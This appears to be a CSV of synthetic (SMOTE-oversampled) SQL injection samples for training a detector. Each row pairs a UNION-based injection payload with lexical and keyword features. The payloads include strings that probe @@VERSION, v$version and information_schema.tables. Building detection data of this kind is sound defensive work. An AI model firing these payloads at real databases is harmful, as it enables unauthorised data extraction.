id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000428,attack,union," select * from users where id  =  '1' union select 1a,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000041,0.14699548662772866,101.26238866658178,26.0,4.085339156594497,63.94679149993634,3.6844028333545538,23.631194333290892,10.0,0.6314566023075944,0.036479877756646906,0.23327735519208734,0.09878616474367136,3.0,0.0,2.0,0.0,1.0,2.0,0.0,1.1102230246251565e-16,0.0,0.0,1.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000429,attack,union," select * from users where id  =  '1' or \.<1 union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000029,0.2318190249934212,76.68161288689318,33.0,4.408806416518799,42.0,4.0,17.568010739077646,13.113602147815529,0.5480379105825557,0.05219408672214815,0.22875182880178388,0.17101617389351234,3.0,0.0,2.0,0.0,1.0,1.1136021478155294,0.0,1.1102230246251565e-16,0.0,0.0,1.0,5.113602147815529,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000430,attack,union," select * from users where id  =  '1' *1 union select 1,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000066,0.25787117327057707,101.76840460095384,26.0,4.083987937311819,62.11579769952308,4.884202300476922,23.88420230047692,10.884202300476925,0.6104088509894328,0.04797515800430169,0.2346810710025249,0.10693492000374058,3.0,0.0,2.0,0.0,1.8842023004769244,2.0,0.0,1.1102230246251565e-16,0.0,0.0,1.0,5.884202300476924,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000431,attack,union,-6912' in boolean mode  )   union all select 6012--,nearest_attack_euclidean,R000284,0.9246550750793572,51.37670963188932,20.869871104332045,3.890774127173325,30.01367705511455,5.363032576774771,11.0,5.0,0.5835318136311578,0.10501545413288041,0.21412375341222378,0.09732897882373809,1.0,0.0,2.6232903681106814,0.0,2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,0.37670963188931816,2.6232903681106814,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000432,attack,union,"-3068%""   )    )    union all select 6597,6597,6597,6597,6597,6597,6597,6597--",nearest_attack_euclidean,R000233,0.39768020354598765,80.57688214329214,23.0,3.848051990019869,14.0,37.030752857316855,15.030752857316852,14.515376428658426,0.17423130098978878,0.4597364460536419,0.18594440164111664,0.1800878513154527,0.0,1.0,3.0,0.0,2.7755575615628914e-17,0.0,0.0,2.257688214329213,1.0,0.0,7.257688214329214,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000433,attack,union," select * from users where id  =  1. union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000049,0.013553439981440226,96.97523994176677,25.975239941766766,4.043788010276807,62.0,4.0,23.0,7.975239941766764,0.63934011207157,0.04124774916590773,0.23717455770396953,0.08223758105855263,0.0,0.0,2.0,0.0,1.0,2.0,0.0,1.1102230246251565e-16,0.0,0.0,1.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000434,attack,union,"-2766%'   )    )    union all select 4458,4458,4458,4458,4458--",nearest_attack_euclidean,R000174,0.5305723658412458,61.68923188746186,22.0,3.815810372401172,14.0,21.902771019938974,15.048614490030513,10.737846377492371,0.2272443222702611,0.3534025749745678,0.24532388244320097,0.17402922031197016,1.0,0.0,3.0,0.0,2.7755575615628914e-17,0.0,0.0,2.262153622507628,1.0,0.0,3.4756927549847436,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000435,attack,union,"-7078'||  (  select 'lcza' where 5076  =  5076 union all select 5076,5076,5076,5076,5076,5076,5076,5076,5076,5076--",nearest_attack_euclidean,R000171,0.3678520082911945,112.35993084460154,26.264006915539845,4.051692494386356,29.0,49.887944675681226,15.0,18.471986168920306,0.2585144518017851,0.44342834234236533,0.13371437162161298,0.1643428342342365,3.0,0.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,8.471986168920306,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000436,attack,union,"1'||  (  select 'ybfo' from dual where 3319  =  3319 union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000199,0.21353082222891354,111.51708517150823,27.696582965698354,4.0193776750642405,70.21366813720657,9.0,17.0,15.303417034301642,0.6290282276746657,0.08098662899621095,0.15297474365950958,0.1370103996696137,3.0,0.0,0.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,7.303417034301644,3.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000437,attack,union,"-3593%' union all select 6346,6346,6346,6346,6346,6346--",nearest_attack_euclidean,R000123,0.14766343546211616,57.19734092090257,20.0,3.7390947325308086,14.0,28.957872736722056,4.0,10.239468184180513,0.24578401084189236,0.5050591869897292,0.07022400309768353,0.17893279907069495,1.0,0.0,3.0,0.0,2.7755575615628914e-17,0.0,0.0,1.1102230246251565e-16,1.0,0.0,5.239468184180514,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000438,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000242,0.031181200860311648,60.747660698639656,22.962616399798467,4.026071312693269,26.87850329934502,15.925232799596936,10.971962299848851,6.971962299848851,0.4423345527467577,0.262042733653413,0.18084157791983785,0.11478113567999146,0.9906540999496168,0.0,3.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,1.981308199899234,3.0,0.9906540999496168,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000439,attack,union," select * from users where id  =  '1' or \<\ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000004,0.2844115619953736,74.91685294128003,32.08314705871997,4.395838188185138,41.83370588256005,3.0,17.083147058719977,13.0,0.5583820031816653,0.040044944356064816,0.22804496025265547,0.17352809220961438,3.0,0.0,2.0,0.0,1.0,1.0,0.0,1.1102230246251565e-16,0.0,0.0,1.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.9168529412800231,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.916852941280023
SMOTE_000440,attack,union," )   union select * from information_schema.tables,",nearest_attack_euclidean,R000031,0.09925100066187707,51.022341266139435,20.991063493544225,4.10616425146371,38.004468253227884,0.004468253227887686,8.013404759683661,5.0,0.7448805717091469,7.979023621229597e-05,0.15703953522925465,0.09800010282538614,0.004468253227887242,0.0,0.0,0.0,0.9955317467721125,0.0,0.0,1.0,0.0,0.9955317467721126,1.0044682532278872,0.9955317467721128,0.004468253227887242,0.0,0.0,0.004468253227887298,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.9955317467721126,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9955317467721128,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.9910634935442255
SMOTE_000441,attack,union,"1'||  (  select 'hvqw' from dual where 4423  =  4423 union all select null,null,null--",nearest_attack_euclidean,R000085,1.0890579910638942,89.91180816296159,29.0,4.256880373830971,45.930560296293805,15.088191837038407,17.0,11.893056029629381,0.5060491082298277,0.17209070378542066,0.18976706632716336,0.13209312165758821,3.0,0.0,2.5534719851853094,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,2.339584044444071,5.553471985185309,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000442,attack,union,"-2582'+  (  select ggim where 5346  =  5346 union all select 5346,5346#",nearest_attack_euclidean,R000234,0.08162506500243998,71.48472495515196,28.951527504484805,4.283682606012983,29.0,20.387779964121563,15.0,7.096944991030391,0.4060064295427914,0.2847918411319061,0.21000332562558177,0.09919840369972074,1.0,0.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,1.0969449910303903,3.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000443,attack,union,"-3790""  )   as ojgb where 5925  =  5925 union all select 5925,5925#",nearest_attack_euclidean,R000145,0.5095943149237764,70.65616151918059,28.56126061769833,4.133934833451462,25.0,22.92492921534447,16.0,6.731232303836117,0.3583056395231157,0.3184372204809324,0.22931560929479405,0.09394153070115774,0.0,1.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,1.731232303836117,2.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000444,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000060,0.24975717421440563,73.14385772889653,31.071928864448267,4.338709224173334,44.0,2.071928864448264,17.0,10.071928864448266,0.6015836091193703,0.028303761031402808,0.23243003079612035,0.13768259905310648,0.0,0.0,2.0,0.0,1.9280711355517341,1.0,0.0,1.1102230246251565e-16,0.07192886444826561,0.0,1.0,5.071928864448266,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000445,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000185,0.4030371546627337,89.78822907933701,26.715291631734804,3.9802077711772927,25.0,37.43058326346961,16.0,11.357645815867402,0.27862833248003116,0.4166074145074772,0.17832213278721992,0.1264421202252718,0.0,1.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,5.357645815867402,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000446,attack,union," select * from users where id  =  '1' or $<\. union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000050,0.04848109474563073,76.0,33.81787637714253,4.4615161646558965,42.0,3.0,17.0,14.0,0.5526315789473685,0.03947368421052633,0.2236842105263158,0.18421052631578946,3.0,0.0,2.0,0.0,1.0,1.0,0.0,1.1102230246251565e-16,0.0,0.0,1.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000447,attack,union," select * from users where id  =  1 | |1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000034,0.22199795993798335,100.46618706505735,26.0,4.029261998858174,62.0,5.0,24.733093532528677,8.73309353252868,0.6171713573323776,0.0497718836558369,0.2461633933552318,0.0868933656565537,0.0,0.0,2.0,0.0,1.0,2.0,0.0,1.1102230246251565e-16,0.0,0.0,1.0,6.733093532528679,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000448,attack,union," select * from users where id  =  '1' or \.<   =  1 union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000033,0.3142087144086573,80.92535326984894,33.0,4.313279072933199,42.0,3.846479038549848,21.23239519274924,13.846479038549848,0.5195341727912756,0.04743249887507184,0.26190221688922943,0.17113111144442317,3.0,0.0,2.0,0.0,1.0,1.8464790385498482,0.0,1.1102230246251565e-16,0.0,0.0,1.0,5.846479038549848,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000449,attack,union,"-5595""   )    )    as xttj where 4562  =  4562 union all select 4562,4562,4562,4562,4562#",nearest_attack_euclidean,R000297,0.940385476608409,82.26050138505553,27.449299907662965,3.9796971315666307,25.0,26.608401108044422,22.0,8.652100277011105,0.30648154651892073,0.3194369350583323,0.2697037609366502,0.10437775748609673,0.0,1.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,2.0,0.0,0.0,2.6521002770111055,2.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000450,attack,union,"-2602' union all select 5715,5715,5715,5715,5715,5715,5715,5715,5715--",nearest_attack_euclidean,R000169,0.06980947067636871,70.0,19.83423612851434,3.5768826158700975,14.0,40.0,4.0,12.0,0.2,0.5714285714285714,0.05714285714285715,0.17142857142857143,1.0,0.0,3.0,0.0,2.7755575615628914e-17,0.0,0.0,1.1102230246251565e-16,0.0,0.0,8.0,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000451,attack,union,"-7084%' union all select 5727,5727,5727,5727,5727,5727,5727,5727,5727,5727--",nearest_attack_euclidean,R000289,0.46406148989747115,73.81316643788553,20.562633287577107,3.5898555920129565,14.0,42.25053315030842,4.0,13.562633287577105,0.18988429760370695,0.5721388428755517,0.05425265645820199,0.1837242030625394,1.0,0.0,3.0,0.0,2.7755575615628914e-17,0.0,0.0,1.1102230246251565e-16,1.0,0.0,8.562633287577105,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000452,attack,union,"-6294"" union all select 9921,9921,9921,9921,9921,9921--",nearest_attack_euclidean,R000194,0.40897119553753597,57.70699945021427,19.458600109957146,3.7121998439372437,14.0,30.165599560171415,4.0,9.541399890042854,0.24306121445363643,0.5222157549101297,0.06944606127246754,0.1652769693637662,0.0,1.0,3.0,0.0,2.7755575615628914e-17,0.0,0.0,1.1102230246251565e-16,0.0,0.0,5.541399890042854,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000453,attack,union," select * from users where id  =  1 union select 1a,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000056,0.18236771018820178,97.40860531032946,25.0,4.024912364797152,63.24516318619768,4.0,23.081721062065895,7.081721062065894,0.6492863042763715,0.04107192023030948,0.23696472820727854,0.07267704728604057,0.0,0.0,2.0,0.0,1.0817210620658937,2.0,0.0,1.1102230246251565e-16,0.0,0.0,1.0,5.081721062065894,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000454,attack,union," select * from users where id  =  '1' or $<\. union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000050,0.0,76.0,34.0,4.466308891573198,42.0,3.0,17.0,14.0,0.5526315789473685,0.03947368421052633,0.2236842105263158,0.18421052631578946,3.0,0.0,2.0,0.0,1.0,1.0,0.0,1.1102230246251565e-16,0.0,0.0,1.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000455,attack,union,"-6186' in boolean mode  )   union all select 2990,2990,2990#",nearest_attack_euclidean,R000267,0.09189809824082833,60.47574577715359,24.90485084456928,4.17603396971512,27.0,16.380596621722866,11.0,6.0951491554307164,0.44670637538893676,0.27057022176126017,0.1819914862695668,0.10073191658023628,1.0,0.0,1.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,2.095149155430717,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000456,attack,union,"-6514   )    )    as pbgg where 6841  =  6841 union all select 6841,6841,6841,6841--",nearest_attack_euclidean,R000076,0.6367121735286978,88.5010545935829,26.45010545935829,3.9057333654690742,25.0,31.60084367486631,22.0,9.900210918716578,0.2833679882422021,0.35567899443622714,0.24936382965313786,0.11158918766843295,0.0,0.0,3.0,0.0,2.7755575615628914e-17,1.0,0.0,2.0,0.0,0.0,3.9002109187165783,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000457,attack,union," select * from users where id  =  '1' or $<\. union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000050,0.0,76.0,34.0,4.466308891573198,42.0,3.0,17.0,14.0,0.5526315789473685,0.03947368421052633,0.2236842105263158,0.18421052631578946,3.0,0.0,2.0,0.0,1.0,1.0,0.0,1.1102230246251565e-16,0.0,0.0,1.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000458,attack,union,"-9507%"" union all select 3342,3342,3342,3342,3342#",nearest_attack_euclidean,R000270,0.48283413844198003,47.52811724186482,22.505623448372962,4.098148681436542,14.0,22.02249379349185,4.0,7.505623448372963,0.2953806038283967,0.4624221670532609,0.08439445823668477,0.15780277088165762,0.0,1.0,1.0,0.0,2.7755575615628914e-17,0.0,0.0,1.1102230246251565e-16,1.0,0.0,3.5056234483729627,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000459,attack,union,"-3116   )    )    as jyiq where 3875  =  3875 union all select 3875,3875,3875,3875,3875,3875,3875,3875#",nearest_attack_euclidean,R000280,0.6702869771193133,105.69475261026415,28.489955020048026,3.971486717344731,25.0,45.9598200801921,22.0,12.734932530072038,0.23698102407966246,0.43427800659241733,0.20854330119010295,0.12019766813781727,0.2449775100240129,0.0,1.0,0.0,2.7755575615628914e-17,1.0,0.0,2.0,0.0,0.0,7.489955020048026,2.0,0.2449775100240128,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000460,attack,union,"-4993"" union all select 6959,6959,6959--",nearest_attack_euclidean,R000241,0.03327878357794156,40.0,19.0,3.9044292803904685,14.0,16.0,4.0,6.0,0.35,0.4,0.1,0.15,0.0,1.0,3.0,0.0,2.7755575615628914e-17,0.0,0.0,1.1102230246251565e-16,0.0,0.0,2.0,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
